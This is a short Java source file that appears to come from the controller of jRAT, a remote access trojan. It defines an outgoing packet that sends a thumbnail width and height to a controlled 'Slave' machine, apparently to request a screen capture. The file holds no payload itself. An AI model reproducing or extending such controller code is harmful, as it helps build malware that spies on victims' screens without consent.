package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet40Thumbnail implements OutgoingPacket {
	
	public static final int DEFAULT_WIDTH = 150;
	public static final int DEFAULT_HEIGHT = 100;
	
	private int width;
	private int height;
	
	public Packet40Thumbnail() {
		this(DEFAULT_WIDTH, DEFAULT_HEIGHT);
	}
	
	public Packet40Thumbnail(int width, int height) {
		if (width <= 0) {
			width = DEFAULT_WIDTH;
		}
		
		if (height <= 0) {
			height = DEFAULT_HEIGHT;
		}
		
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(width);
		slave.writeInt(height);
	}

	@Override
	public short getPacketId() {
		return 40;
	}

}
